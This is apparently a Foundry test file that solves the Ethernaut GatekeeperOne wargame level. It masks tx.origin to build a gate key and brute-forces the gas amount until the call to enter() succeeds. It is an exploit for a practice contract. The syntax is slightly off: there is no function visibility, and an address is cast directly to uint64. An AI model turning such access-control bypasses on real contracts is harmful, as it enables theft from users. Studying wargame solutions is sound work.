// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "ethernaut/Gatekeeper1.sol";



contract ContractTest is Test {

    GatekeeperOne gate = new GatekeeperOne();

    function testexploit(){
        /**
         * @notice make 0x11111111 be equal to 0x00001111 using mask 0x0000FFFF
         * @notice So we need to make 0x00000000001111 be != 0xXXXXXXXX00001111 by using mask 0xFFFFFFFF0000FFFF which will keep the previous values intact
         * @dev apply mask to`tx.origin` casted to a bytes8 as address is 20 bytes
         */
        bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 400; i++) {
            (bool success, ) = address(gate).call{gas: i + (9000 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}